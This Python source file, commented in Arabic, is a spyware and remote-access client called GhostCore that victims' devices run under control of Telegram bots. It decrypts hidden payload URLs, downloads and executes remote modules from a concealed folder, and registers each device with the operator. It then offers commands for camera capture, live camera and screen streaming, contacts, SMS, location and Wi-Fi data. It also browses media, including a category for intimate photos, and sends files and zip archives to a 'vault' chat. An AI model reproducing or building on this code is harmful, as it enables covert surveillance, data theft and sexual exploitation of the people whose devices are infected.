# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import base64
import threading
import importlib
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ==================== استيراد الأسرار من الملف المُنشأ أثناء البناء ====================
try:
    from secrets import ENCRYPTION_KEY, BOT_TOKENS, CONTROL_ID, VAULT_ID
except ImportError:
    print("[!] Secrets not found. Exiting.")
    sys.exit(0)

# ==================== الروابط المشفرة (14 رابطاً) ====================
PAYLOAD_URLS_ENCRYPTED = [
    "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"
]

BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
sys.path.append(BASE_DIR)

def decrypt_data(encrypted_b64):
    try:
        data = base64.b64decode(encrypted_b64)
        iv, tag, ciphertext = data[:12], data[-16:], data[12:-16]
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
    except:
        return None

PAYLOAD_URLS = [decrypt_data(url) for url in PAYLOAD_URLS_ENCRYPTED if decrypt_data(url)]

class GhostCore:
    def __init__(self):
        self.device_name = f"Device_{int(time.time())}"
        self.topic_id = None
        self.last_update_id = 0
        self.current_bot = BOT_TOKENS[0]
        self.selected_media = []
        self.current_page = 0
        self.media_list = []
        self.media_type = "all"
        self.items_per_page = 25
        self.heartbeat_interval = 3600  # 1 ساعة
        self.last_heartbeat = time.time()

    # ==================== دوال الإرسال الأساسية ====================
    def _send_request(self, method, endpoint, json_data=None, files=None, params=None):
        for token in BOT_TOKENS:
            try:
                url = f"https://api.telegram.org/bot{token}/{endpoint}"
                if files:
                    res = requests.request(method, url, data=params, files=files, timeout=15)
                elif json_data:
                    res = requests.request(method, url, json=json_data, timeout=15)
                else:
                    res = requests.request(method, url, params=params, timeout=15)
                if res.status_code == 200:
                    self.current_bot = token
                    return res.json()
            except:
                continue
        return None

    def send_message(self, chat_id, text, reply_markup=None, thread_id=None):
        json_data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        if thread_id:
            json_data["message_thread_id"] = thread_id
        if reply_markup:
            json_data["reply_markup"] = json.dumps(reply_markup)
        return self._send_request("POST", "sendMessage", json_data=json_data)

    # ==================== إدارة التبويت والواجهة ====================
    def create_topic(self):
        data = self._send_request("POST", "createForumTopic", json={
            "chat_id": CONTROL_ID,
            "name": f"📱 {self.device_name}"
        })
        if data and data.get("ok"):
            self.topic_id = data['result']['message_thread_id']
            self.send_main_menu()
            self._send_heartbeat()  # إرسال أول نبضة عند بدء التشغيل
            # بدء خيط النبض الخلفي
            threading.Thread(target=self._heartbeat_loop, daemon=True).start()
        else:
            time.sleep(2)
            self.create_topic()

    def _send_heartbeat(self):
        """إرسال رسالة نبض صامت (مرئية فقط في حال وجود جلسة نشطة)"""
        self.send_message(
            CONTROL_ID,
            f"🟢 Heartbeat: `{self.device_name}` is alive",
            thread_id=self.topic_id
        )

    def _heartbeat_loop(self):
        """حلقة إرسال النبض بشكل دوري"""
        while True:
            time.sleep(self.heartbeat_interval)
            self._send_heartbeat()

    def send_main_menu(self):
        # تفريغ الذاكرة قبل عرض القائمة الرئيسية (لتجنب تراكم مسارات الملفات)
        self.media_list = []
        self.selected_media = []
        btns = {
            "inline_keyboard": [
                [{"text": "🖼️ كل الوسائط", "callback_data": "browse_all_0"},
                 {"text": "🔞 صور 🔞", "callback_data": "browse_nsfw_0"}],
                [{"text": "🎮 قائمة التحكم", "callback_data": "control_menu"},
                 {"text": "♻️ تحديث النظام", "callback_data": "reload_sys"}]
            ]
        }
        self._send_request("POST", "sendMessage", json={
            "chat_id": CONTROL_ID,
            "message_thread_id": self.topic_id,
            "text": f"✅ النظام نشط\nالجهاز: {self.device_name}",
            "reply_markup": btns
        })

    def send_control_menu(self):
        btns = {
            "inline_keyboard": [
                [{"text": "📸 كاميرا أمامية", "callback_data": "cmd_front_cam"},
                 {"text": "📸 كاميرا خلفية", "callback_data": "cmd_back_cam"}],
                [{"text": "🎥 بث مباشر (كاميرا)", "callback_data": "cmd_live_cam"},
                 {"text": "🖥️ بث مباشر (شاشة)", "callback_data": "cmd_live_screen"}],
                [{"text": "🔴 إيقاف البث", "callback_data": "cmd_stop_stream"}],
                [{"text": "📞 جهات الاتصال", "callback_data": "cmd_contacts"},
                 {"text": "💬 الرسائل (SMS)", "callback_data": "cmd_sms"}],
                [{"text": "📍 الموقع", "callback_data": "cmd_location"},
                 {"text": "📶 شبكات Wi-Fi", "callback_data": "cmd_wifi"}],
                [{"text": "🗑️ حذف الصور 🔞", "callback_data": "cmd_delete_nsfw"},
                 {"text": "💣 تدمير التطبيق", "callback_data": "cmd_self_destruct"}],
                [{"text": "🔙 العودة للرئيسية", "callback_data": "main_menu"}]
            ]
        }
        self._send_request("POST", "sendMessage", json={
            "chat_id": CONTROL_ID,
            "message_thread_id": self.topic_id,
            "text": "🎮 قائمة التحكم بالجهاز",
            "reply_markup": btns
        })

    # ==================== تحميل وإدارة البايلودات ====================
    def download_payloads(self):
        """تحميل جميع البايلودات من Gists (يتحقق من وجود الملفات ويتجنب التحميل الزائد)"""
        for url in PAYLOAD_URLS:
            try:
                name = url.split('/')[-1]
                target_path = os.path.join(BASE_DIR, name)
                # إذا كان الملف موجوداً ومطابقاً للملف عن بُعد، يمكن تخطيه (اختياري)
                # لكننا سنقوم بالتحميل دائماً لضمان التحديث
                r = requests.get(url, timeout=15)
                if r.status_code == 200:
                    with open(target_path, 'w', encoding='utf-8') as f:
                        f.write(r.text)
            except:
                continue

    def reload_payloads(self):
        """إعادة تحميل البايلودات في خيط منفصل مع تفريغ الذاكرة أولاً"""
        def task():
            self.send_message(CONTROL_ID, "⏳ جاري تحديث الملفات (14 ملف)... قد يستغرق دقيقة.", thread_id=self.topic_id)
            self.download_payloads()
            # إعادة تحميل الموديولات التي تم تغييرها
            for mod_name in ["commands", "telegram_ui", "monitor"]:
                if mod_name in sys.modules:
                    importlib.reload(sys.modules[mod_name])
            # تفريغ الذاكرة بعد إعادة التحميل
            self.media_list = []
            self.selected_media = []
            self.send_message(CONTROL_ID, "✅ اكتمل تحديث الملفات. يمكنك استخدام الأوامر الجديدة فوراً.", thread_id=self.topic_id)
        threading.Thread(target=task, daemon=True).start()

    # ==================== تصفح الوسائط ====================
    def handle_browse(self, category, page):
        self.media_type = category
        self.current_page = page
        try:
            import commands
            # إعادة تحميل commands لضمان أحدث نسخة (بعد التحديث التلقائي)
            importlib.reload(commands)
            if category == "all":
                self.media_list = commands.get_media_list()
            else:
                self.media_list = commands.get_nsfw_media_list()
        except Exception as e:
            self.media_list = []
            self.send_message(CONTROL_ID, f"⚠️ خطأ في جلب الوسائط: {e}", thread_id=self.topic_id)
        self.display_media_page()

    def display_media_page(self):
        start = self.current_page * self.items_per_page
        end = start + self.items_per_page
        page_items = self.media_list[start:end]
        if not page_items:
            self.send_message(CONTROL_ID, "📭 لا توجد وسائط في هذا القسم.", thread_id=self.topic_id)
            return
        for idx, path in enumerate(page_items):
            global_idx = start + idx
            btns = {
                "inline_keyboard": [
                    [{"text": "👁️ معاينة", "callback_data": f"preview_{global_idx}"},
                     {"text": "✅ تحديد", "callback_data": f"select_{global_idx}"}],
                    [{"text": "ℹ️ معلومات", "callback_data": f"info_{global_idx}"},
                     {"text": "📥 تحميل", "callback_data": f"download_{global_idx}"}]
                ]
            }
            self.send_message(CONTROL_ID, f"📄 {os.path.basename(path)}", reply_markup=btns, thread_id=self.topic_id)
        # أزرار التنقل
        nav_btns = []
        if self.current_page > 0:
            nav_btns.append({"text": "⬅️ السابقة", "callback_data": f"browse_{self.media_type}_{self.current_page-1}"})
        if end < len(self.media_list):
            nav_btns.append({"text": "التالي ➡️", "callback_data": f"browse_{self.media_type}_{self.current_page+1}"})
        if nav_btns:
            nav_btns.append({"text": "📦 تحميل المحدد", "callback_data": "download_selected"})
            nav_btns.append({"text": "🗜️ ضغط وتحميل المحدد", "callback_data": "zip_selected"})
            self.send_message(CONTROL_ID, f"صفحة {self.current_page+1}", reply_markup={"inline_keyboard": [nav_btns]}, thread_id=self.topic_id)

    # ======================= حلقة الاستماع =======================
    def listen(self):
        while True:
            updates = self._send_request("GET", f"getUpdates?offset={self.last_update_id + 1}")
            if updates and updates.get("ok") and updates.get("result"):
                for u in updates["result"]:
                    self.last_update_id = u["update_id"]
                    if "callback_query" in u:
                        self.process_callback(u["callback_query"])
            time.sleep(2)

    # ======================= معالجة الأزرار =======================
    def process_callback(self, cb):
        data = cb["data"]
        if data.startswith("browse_"):
            parts = data.split("_")
            self.handle_browse(parts[1], int(parts[2]))
        elif data == "control_menu":
            self.send_control_menu()
        elif data == "main_menu":
            # تفريغ الذاكرة عند العودة للقائمة الرئيسية
            self.media_list = []
            self.selected_media = []
            self.send_main_menu()
        elif data == "reload_sys":
            self.reload_payloads()
        elif data.startswith("cmd_"):
            cmd = data[4:]
            try:
                import commands
                importlib.reload(commands)
                if hasattr(commands, 'execute_command'):
                    result = commands.execute_command(cmd)
                    if result.get("file"):
                        with open(result["file"], 'rb') as f:
                            self._send_request("POST", "sendDocument", files={'document': f}, json={
                                "chat_id": VAULT_ID,
                                "caption": result.get("caption", "")
                            })
                    elif result.get("text"):
                        self.send_message(CONTROL_ID, result["text"], thread_id=self.topic_id)
            except Exception as e:
                self.send_message(CONTROL_ID, f"❌ خطأ في تنفيذ الأمر: {str(e)}", thread_id=self.topic_id)
        elif data.startswith("preview_"):
            idx = int(data.split("_")[1])
            path = self.media_list[idx]
            try:
                import commands
                importlib.reload(commands)
                if hasattr(commands, 'get_preview'):
                    preview = commands.get_preview(path)
                    if preview:
                        self._send_request("POST", "sendPhoto", files={'photo': preview}, json={
                            "chat_id": CONTROL_ID,
                            "caption": f"معاينة: {os.path.basename(path)}",
                            "message_thread_id": self.topic_id
                        })
                    else:
                        self.send_message(CONTROL_ID, "❌ لا يمكن إنشاء معاينة", thread_id=self.topic_id)
            except:
                pass
        elif data.startswith("download_"):
            idx = int(data.split("_")[1])
            path = self.media_list[idx]
            try:
                with open(path, 'rb') as f:
                    self._send_request("POST", "sendDocument", files={'document': f}, json={
                        "chat_id": VAULT_ID,
                        "caption": os.path.basename(path)
                    })
                self.send_message(CONTROL_ID, "✅ تم الإرسال إلى الخزنة", thread_id=self.topic_id)
            except:
                pass
        elif data.startswith("info_"):
            idx = int(data.split("_")[1])
            path = self.media_list[idx]
            try:
                import commands
                importlib.reload(commands)
                if hasattr(commands, 'get_file_info'):
                    info = commands.get_file_info(path)
                    msg = f"📄 {os.path.basename(path)}\n📏 الحجم: {info.get('size', '?')}\n🕒 التعديل: {info.get('modified', '?')}"
                    self.send_message(CONTROL_ID, msg, thread_id=self.topic_id)
            except:
                pass
        elif data.startswith("select_"):
            idx = int(data.split("_")[1])
            path = self.media_list[idx]
            if path not in self.selected_media:
                self.selected_media.append(path)
            self._send_request("POST", "answerCallbackQuery", json={
                "callback_query_id": cb["id"],
                "text": f"✅ تم تحديد {os.path.basename(path)}",
                "show_alert": False
            })
        elif data == "download_selected":
            if not self.selected_media:
                self.send_message(CONTROL_ID, "⚠️ لم تقم بتحديد أي ملفات بعد.", thread_id=self.topic_id)
                return
            for path in self.selected_media:
                try:
                    with open(path, 'rb') as f:
                        self._send_request("POST", "sendDocument", files={'document': f}, json={
                            "chat_id": VAULT_ID,
                            "caption": os.path.basename(path)
                        })
                except:
                    pass
            self.selected_media = []
            self.send_message(CONTROL_ID, "✅ تم إرسال الملفات المحددة إلى الخزنة", thread_id=self.topic_id)
        elif data == "zip_selected":
            if not self.selected_media:
                self.send_message(CONTROL_ID, "⚠️ لم تقم بتحديد أي ملفات بعد.", thread_id=self.topic_id)
                return
            import zipfile
            from io import BytesIO
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                for path in self.selected_media:
                    zf.write(path, os.path.basename(path))
            zip_buffer.seek(0)
            self._send_request("POST", "sendDocument", files={'document': ('selected.zip', zip_buffer)}, json={
                "chat_id": VAULT_ID,
                "caption": f"📦 {len(self.selected_media)} ملفات محددة"
            })
            self.selected_media = []
            self.send_message(CONTROL_ID, "✅ تم ضغط الملفات المحددة وإرسالها إلى الخزنة", thread_id=self.topic_id)

# ======================= بدء التشغيل =======================
if __name__ == "__main__":
    core = GhostCore()
    core.download_payloads()
    core.create_topic()
    threading.Thread(target=core.listen, daemon=True).start()
    while True:
        time.sleep(60)
